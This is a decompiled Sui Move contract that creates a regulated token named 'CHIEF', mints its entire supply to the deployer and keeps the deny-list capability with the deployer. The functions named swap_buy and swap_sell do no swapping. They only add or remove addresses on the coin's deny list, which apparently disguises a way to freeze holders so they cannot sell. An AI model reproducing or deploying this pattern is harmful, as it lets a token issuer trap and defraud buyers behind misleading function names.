module 0xda295ea880fd4889159e8b081f8c1ad04a98f737618a57471fb5917b18bf9b29::chief {
    struct CHIEF has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: CHIEF, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHIEF>(arg0, 9, b"CHIEF", b"Chief Nut", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmWzb2rbg8NSRry1LbtqHaFG2p1MceHFQH1MoR7HDiuREw"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHIEF>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHIEF>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CHIEF>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHIEF>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHIEF>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHIEF>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHIEF>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CHIEF>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

